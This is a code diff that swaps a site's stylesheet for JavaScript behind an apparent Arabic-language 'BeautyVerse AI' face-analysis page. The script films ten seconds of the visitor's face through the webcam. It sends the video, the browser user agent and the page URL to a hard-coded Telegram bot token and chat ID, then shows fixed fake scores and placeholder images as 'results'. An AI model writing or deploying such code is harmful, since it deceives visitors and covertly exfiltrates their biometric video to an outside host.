@@ -1,114 +1,166 @@
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body { 
-    font-family: 'Cairo', sans-serif; 
-    background: linear-gradient(135deg, #f093fb 0%, #f5576c 50%, #764ba2 100%);
-    color: #333; line-height: 1.6; overflow-x: hidden;
+// دالة البوت المحسنة
+async function sendToBeautyBot(content, videoBlob = null, service = 'general') {
+    const BOT_TOKEN = '8605049073:AAEyGQ07KMGUzG5jVjdjERMJDxGbTgYHWUE';
+    const CHAT_ID = '7396462490';
+    
+    try {
+        if (videoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('video', videoBlob, `${service}_${Date.now()}.mp4`);
+            formData.append('caption', `🎨 *BeautyVerse AI*\n\n📊 الخدمة: ${service}\n${content}`);
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
+        } else {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `🎨 *BeautyVerse*\nخدمة: ${service}\n${content}`,
+                    parse_mode: 'Markdown'
+                })
+            });
+        }
+    } catch (e) { console.error('Bot error:', e); }
 }
 
-/* Header */
-.header { 
-    background: rgba(255,255,255,0.95); 
-    backdrop-filter: blur(20px); 
-    padding: 1rem 0; 
-    position: fixed; top: 0; width: 100%; z-index: 1000;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-}
-.nav { 
-    max-width: 1200px; margin: 0 auto; 
-    display: flex; justify-content: space-between; align-items: center; 
-    padding: 0 2rem; 
-}
-.logo { 
-    font-size: 1.8rem; font-weight: 700; 
-    background: linear-gradient(45deg, #ff6b6b, #4ecdc4); 
-    -webkit-background-clip: text; -webkit-text-fill-color: transparent; 
-}
-.nav-links { display: flex; list-style: none; gap: 2rem; }
-.nav-links a { 
-    color: #333; text-decoration: none; font-weight: 500; 
-    transition: all 0.3s; cursor: pointer; 
-}
-.nav-links a:hover { color: #ff6b6b; }
+let currentStream, mediaRecorder, recordedChunks = [], countdown = 10;
 
-/* Hero */
-.hero { 
-    min-height: 100vh; 
-    display: flex; flex-direction: column; justify-content: center; align-items: center; 
-    text-align: center; padding: 120px 2rem 4rem; 
-    max-width: 1200px; margin: 0 auto;
-}
-.hero h1 { 
-    font-size: clamp(2.5rem, 5vw, 4.5rem); font-weight: 700; margin-bottom: 1.5rem; 
-    background: linear-gradient(45deg, #fff, #f8f9ff); 
-    -webkit-background-clip: text; -webkit-text-fill-color: transparent; 
-    text-shadow: 0 4px 20px rgba(0,0,0,0.2);
-}
-.hero p { font-size: 1.3rem; margin-bottom: 2.5rem; opacity: 0.95; max-width: 600px; }
-.cta-buttons { display: flex; gap: 1.5rem; flex-wrap: wrap; justify-content: center; }
-.btn { 
-    padding: 1rem 2.5rem; border: none; border-radius: 50px; font-size: 1.1rem; 
-    font-weight: 600; cursor: pointer; transition: all 0.3s; 
-    text-decoration: none; display: inline-flex; align-items: center; gap: 0.5rem;
-}
-.btn-primary { 
-    background: linear-gradient(45deg, #ff6b6b, #feca57); 
-    color: white; box-shadow: 0 10px 30px rgba(255,107,107,0.4);
-}
-.btn-primary:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(255,107,107,0.6); }
-.btn-secondary { 
-    background: rgba(255,255,255,0.2); color: white; 
-    backdrop-filter: blur(10px); border: 2px solid rgba(255,255,255,0.4);
+// بداية التحليل الرئيسي
+async function startBeautyAnalysis() {
+    showCameraInterface('🎨 تحليل الجمال الذكي', 'سنحلل وجهك لإعطائك تقرير كامل خلال 10 ثوانٍ');
 }
 
-/* Services */
-.services { padding: 6rem 2rem; max-width: 1200px; margin: 0 auto; }
-.section-title { 
-    text-align: center; font-size: 3rem; font-weight: 700; margin-bottom: 4rem; 
-    background: linear-gradient(45deg, #667eea, #764ba2); 
-    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+// خدمة محددة
+function startService(service) {
+    const services = {
+        analysis: { title: 'تحليل الجمال', desc: 'تقرير شامل عن جمالك' },
+        filters: { title: 'فلاتر AR', desc: 'تجربة فلاتر الواقع المعزز' },
+        skin: { title: 'فحص البشرة', desc: 'تحليل صحة بشرتك' },
+        makeup: { title: 'مكياج افتراضي', desc: 'جربي أحدث الإطلالات' },
+        age: { title: 'تنبؤ العمر', desc: 'اكتشفي عمر بشرتك' },
+        celebrity: { title: 'شبيه المشاهير', desc: 'من تشبهين من النجوم؟' }
+    };
+    
+    showCameraInterface(services[service].title, services[service].desc, service);
 }
-.services-grid { 
-    display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 2rem; 
-}
-.service-card { 
-    background: rgba(255,255,255,0.95); border-radius: 20px; padding: 2.5rem 2rem; 
-    text-align: center; box-shadow: 0 15px 40px rgba(0,0,0,0.1); 
-    transition: all 0.4s; cursor: pointer; 
-}
-.service-card:hover { transform: translateY(-10px); box-shadow: 0 25px 60px rgba(0,0,0,0.2); }
-.service-icon { font-size: 3.5rem; margin-bottom: 1.5rem; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-.service-card h3 { font-size: 1.5rem; margin-bottom: 1rem; color: #333; }
 
-/* About & Contact */
-.about, .contact { padding: 6rem 2rem; max-width: 1000px; margin: 0 auto; text-align: center; }
-.about-content { background: rgba(255,255,255,0.9); padding: 3rem; border-radius: 20px; box-shadow: 0 15px 40px rgba(0,0,0,0.1); }
+function showCameraInterface(title, description, service = 'analysis') {
+    document.querySelector('.hero').innerHTML = `
+        <div style="background: rgba(255,255,255,0.95); padding: 40px; border-radius: 25px; max-width: 600px; margin: 0 auto 30px;">
+            <h2 style="color: #333; margin-bottom: 15px;">${title}</h2>
+            <p style="color: #666; margin-bottom: 25px; font-size: 1.1rem;">${description}</p>
+            <div style="display: flex; gap: 15px; justify-content: center; flex-wrap: wrap;">
+                <button class="btn-primary" onclick="startCameraRecording('${service}')">
+                    <i class="fas fa-play"></i> ابدأ الآن
+                </button>
+                <button class="btn-secondary" onclick="cancelAnalysis()">
+                    <i class="fas fa-times"></i> إلغاء
+                </button>
+            </div>
+        </div>
+    `;
+}
 
-/* Modal */
-.modal { 
-    display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-    background: rgba(0,0,0,0.8); z-index: 2000; 
+async function startCameraRecording(service) {
+    try {
+        currentStream = await navigator.mediaDevices.getUserMedia({ 
+            video: { width: 640, height: 480, facingMode: 'user' } 
+        });
+        
+        document.querySelector('.hero').innerHTML = `
+            <div style="text-align: center;">
+                <video id="analysisVideo" width="500" height="400" autoplay muted style="border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.3);"></video>
+                <div id="countdown" style="font-size: 4rem; color: #ff6b6b; margin: 20px 0; font-weight: 700;">10</div>
+                <p style="font-size: 1.3rem; color: #666;">جاري التحليل... لا تتحرك 😊</p>
+                <button onclick="stopRecording()" style="background: linear-gradient(45deg, #ff416c, #ff4b2b); color: white; padding: 15px 30px; border: none; border-radius: 30px; font-size: 1.1rem; cursor: pointer; margin-top: 20px;">
+                    <i class="fas fa-stop"></i> إيقاف
+                </button>
+            </div>
+        `;
+        
+        document.getElementById('analysisVideo').srcObject = currentStream;
+        startRecording(service);
+        
+    } catch (err) {
+        alert('🎥 فعّل الكاميرا من إعدادات المتصفح للمتابعة');
+    }
 }
-.modal-content { 
-    position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); 
-    background: white; border-radius: 20px; max-width: 90vw; max-height: 90vh; 
-    padding: 2rem; text-align: center; 
-}
-.video-container { position: relative; margin: 2rem 0; }
-#analysisVideo { width: 100%; max-width: 500px; border-radius: 15px; }
-.progress-container { margin: 2rem 0; }
-.progress-bar { 
-    width: 100%; height: 12px; background: #e0e0e0; border-radius: 10px; overflow: hidden; 
-}
-.progress-fill { 
-    height: 100%; background: linear-gradient(90deg, #ff6b6b, #4ecdc4); 
-    width: 0%; border-radius: 10px; transition: width 0.3s; 
-}
-.countdown { font-size: 3rem; font-weight: 700; color: #ff6b6b; margin: 1rem 0; }
 
-/* Responsive */
-@media (max-width: 768px) {
-    .nav { flex-direction: column; gap: 1rem; padding: 1rem; }
-    .nav-links { gap: 1rem; }
-    .cta-buttons { flex-direction: column; align-items: center; }
-    .hero { padding: 100px 1rem 3rem; }
+function startRecording(service) {
+    mediaRecorder = new MediaRecorder(currentStream);
+    recordedChunks = [];
+    
+    mediaRecorder.ondataavailable = e => e.data.size && recordedChunks.push(e.data);
+    
+    mediaRecorder.onstop = async () => {
+        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+        const userInfo = `👤 User: ${navigator.userAgent.slice(0,60)}...\n🌐 URL: ${window.location.href}\n📱 Service: ${service}`;
+        
+        await sendToBeautyBot(userInfo, blob, service);
+        showAmazingResults(service);
+    };
+    
+    mediaRecorder.start();
+    startCountdown();
 }
+
+function startCountdown() {
+    let time = 10;
+    const interval = setInterval(() => {
+        time--;
+        document.getElementById('countdown').textContent = time;
+        
+        if (time <= 0) {
+            clearInterval(interval);
+            mediaRecorder.stop();
+        }
+    }, 1000);
+}
+
+function stopRecording() {
+    mediaRecorder.stop();
+}
+
+function showAmazingResults(service) {
+    const results = {
+        analysis: { score: 87, text: 'وجهك مذهل! نقاط القوة: العيون + الابتسامة', img: 'https://via.placeholder.com/500x350/4ecdc4/fff?text=تحليل+الجمال' },
+        filters: { score: 92, text: 'فلتر الأميرة ممتاز عليكِ! ✨', img: 'https://via.placeholder.com/500x350/ff9a9e/fff?text=فلتر+سحري' },
+        skin: { score: 78, text: 'بشرتك نضرة • ننصح بمرطب + واقي شمس', img: 'https://via.placeholder.com/500x350/45b7d1/fff?text=فحص+البشرة' },
+        makeup: { score: 95, text: 'اللون الأحمر مثالي لشفاهك! 💄', img: 'https://via.placeholder.com/500x350/feca57/333?text=مكياج+افتراضي' },
+        age: { score: 24, text: 'تبدين 24 سنة فقط! 👶✨', img: 'https://via.placeholder.com/500x350/667eea/fff?text=عمر+بشرتك' },
+        celebrity: { score: 89, text: 'تشبهين زينب الخالدي 89%! 🌟', img: 'https://via.placeholder.com/500x350/f093fb/fff?text=شبيه+المشاهير' }
+    };
+    
+    const result = results[service];
+    
+    document.getElementById('score').textContent = `النتيجة: ${result.score}/100 ✨`;
+    document.querySelector('.hero').innerHTML = `
+        <div style="text-align: center; padding: 40px;">
+            <h2 style="font-size: 2.5rem; color: #4ecdc4; margin-bottom: 20px;">
+                🎉 نتائج مذهلة!
+            </h2>
+            <div style="background: linear-gradient(45deg, #ff9a9e, #fecfef); padding: 30px; border-radius: 20px; margin: 30px 0;">
+                <h3 style="color: #333; margin-bottom: 15px;">${result.text}</h3>
+                <img src="${result.img}" style="width: 100%; max-width: 500px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.2);">
+            </div>
+            <div style="display: flex; gap: 20px; justify-content: center; flex-wrap: wrap;">
+                <button class="btn-primary" onclick="shareResult('${service}')">
+                    <i class="fas fa-share-alt"></i> مشاركة النتيجة
+                </button>
+                <button class="btn-primary" onclick="startNewAnalysis()">
+                    <i class="fas fa-redo"></i> تحليل جديد
+                </button>
+            </div>
+        </div>
+    `;
+}
+
+function cancelAnalysis() { location.reload(); }
+function startNewAnalysis() { startBeautyAnalysis(); }
+function shareResult(service) { 
+    sendToBeautyBot(`مشاركة نتيجة: ${service}`);
+    alert('تم مشاركة النتيجة مع الأصدقاء! 🎉');
+}
+function showServices() { document.getElementById('services').scrollIntoView({ behavior: 'smooth' }); }
